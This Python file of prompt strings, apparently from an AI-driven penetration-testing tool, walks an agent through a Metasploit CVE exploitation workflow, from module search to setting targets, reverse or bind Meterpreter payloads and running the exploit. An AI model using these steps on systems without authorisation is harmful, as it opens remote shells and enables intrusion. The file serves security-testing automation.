"""
RedAmon CVE-Based Exploitation Prompts

Prompts for CVE-based vulnerability exploitation workflow.
"""

from .base import METASPLOIT_CONSOLE_HEADER


# =============================================================================
# CVE EXPLOITATION TOOLS (13-step workflow)
# =============================================================================

CVE_EXPLOIT_TOOLS = METASPLOIT_CONSOLE_HEADER + """
## ⚠️ ATTACK PATH: CVE EXPLOITATION ⚠️

**CRITICAL: This attack path has been CLASSIFIED as CVE-based exploitation.**
**You MUST use the CVE exploitation workflow below.**

Focus on exploiting the identified CVE vulnerability. Do NOT switch to brute force
or credential guessing unless the CVE exploitation fails completely.

---

## MANDATORY CVE EXPLOITATION WORKFLOW

**This is the SINGLE SOURCE OF TRUTH for CVE exploitation workflow.**
**NEVER guess module names!** Module names are NOT predictable from CVE IDs.

Complete ALL 13 steps in order (chain `set` commands with semicolons `;`):

### 1. Search for CVE
`"search CVE-XXXX-XXXXX"` -> Returns EXACT module path(s)

### 2. Use module
`"use exploit/path/from/search"` -> Load module from step 1

### 3. Get module info
`"info"` -> Overview of module (description, references, general info)

### 4. Show targets
`"show targets"` -> List all available targets (OS/app versions)

### 5. Show options
`"show options"` -> Display all configurable parameters with current values

### 6. Set TARGET (MOST COMMON FAILURE POINT!)
`"set TARGET <N>"` -> Choose based on mode:

**Current mode determines which TARGET type to use:**
- **Statefull mode** -> Use "Dropper", "Staged", or "Meterpreter" targets (creates persistent session)
- **Stateless mode** -> Use "Command", "In-Memory", or "Exec" targets (returns command output)

**Why this matters:**
- Wrong TARGET type = Incompatible payload error OR exploit succeeds but no session/output
- Always run `show targets` first and select the appropriate type for your current mode
- This is the #1 cause of failed exploitations - verify mode before selecting TARGET

### 7. Show payloads
`"show payloads"` -> List payloads compatible with selected TARGET

### 8. Set CVE variant (if applicable)
`"set CVE CVE-XXXX-XXXXX"` -> Only if module supports multiple CVE variants

Check `show options` output for CVE option. Match variant to target's software version.
**Wrong variant = "not vulnerable" error even if target IS vulnerable.**

### 9. Set PAYLOAD
`"set PAYLOAD <payload>"` -> See "Payload Selection" section below

### 10. Set target connection options (chain with semicolons)
```
set RHOSTS <target-ip>; set RPORT <target-port>; set SSL false
```

### 11. Set mode-specific options (chain with semicolons)

**Statefull mode with REVERSE payload (reverse_tcp/reverse_https):**
```
set LHOST <your-attacker-ip>; set LPORT <port-number>
```
- LHOST = Your IP that the target will connect BACK to (REQUIRED for reverse payloads)
- LPORT = Port you'll listen on

**Statefull mode with BIND payload (bind_tcp):**
```
set LPORT <target-port>
```
- NO LHOST needed (you connect TO the target)

**Stateless mode:**
```
set CMD id; set AllowNoCleanup true
```

### 12. Execute exploit
`"exploit"`

"""


# =============================================================================
# CVE PAYLOAD GUIDANCE (Statefull Mode)
# =============================================================================

CVE_PAYLOAD_GUIDANCE_STATEFULL = """
## Payload Selection (Statefull Mode) - SESSION REQUIRED

**GOAL: You MUST establish a Meterpreter/shell session!**

**Target Selection:** Use "Dropper", "Staged", or "Meterpreter" targets (see EXPLOITATION_TOOLS Step 6).

### Payload Selection (Session-capable only!)

**Choose based on network conditions and available payloads from `show payloads`:**
- **bind_tcp** -> Target opens port, you connect TO target. Use when you can reach target's ports.
- **reverse_tcp** -> You listen, target connects BACK to you. Use when target can reach your IP.
- **reverse_http/https** -> HTTP(S) connection, good for bypassing firewalls.

**Example session-capable payloads (check `show payloads` output for available options):**
- `cmd/unix/python/meterpreter/bind_tcp`
- `cmd/unix/python/meterpreter/reverse_tcp`
- `cmd/unix/python/meterpreter/reverse_http`
- `linux/x64/meterpreter/bind_tcp`
- `linux/x64/meterpreter/reverse_tcp`
- `windows/meterpreter/reverse_tcp`

**Choose the appropriate payload based on:**
1. Target OS (Linux, Windows, Unix)
2. Network reachability (bind vs reverse)
3. Firewall restrictions (HTTP/HTTPS if needed)
4. Available payloads from `show payloads` output

**NEVER use:** `cmd/unix/generic`, `cmd/unix/reverse`, or other stateless payloads!

### After Exploit - What to Look For

**Success indicators:**
- `[*] Meterpreter session X opened` -> Session created!
- `[*] Sending stage...` -> Wait for transfer

**Failure indicators:**
- Command output like `uid=0(root)` WITHOUT session -> Wrong TARGET! Check `show targets` and select a Dropper/Staged/Meterpreter target
- `[-] Exploit failed` -> Check RHOSTS/RPORT settings

**After session opens:** Request transition to `post_exploitation` phase.
"""


# =============================================================================
# CVE PAYLOAD GUIDANCE (Stateless Mode)
# =============================================================================

CVE_PAYLOAD_GUIDANCE_STATELESS = """
## Payload Selection (Stateless Mode, no sessions)

**GOAL: Prove RCE with a single command execution, without session activation.**

**Target Selection:** Use "Command", "In-Memory", or "Exec" targets (see EXPLOITATION_TOOLS Step 6).
**Payload:** `cmd/unix/generic` or `cmd/windows/generic`
**Required options:** `set CMD id` and `set AllowNoCleanup true` (if needed)

### After Exploit

- Success = command output visible (e.g., `uid=0(root)...`)
- No output = wrong TARGET selected, change and retry

### STOP After Proof!

After successful PoC:
- If user requested specific post-exploitation actions -> `action="transition_phase"`
- If user just wanted to test vulnerability -> `action="ask_user"` to confirm next steps
"""
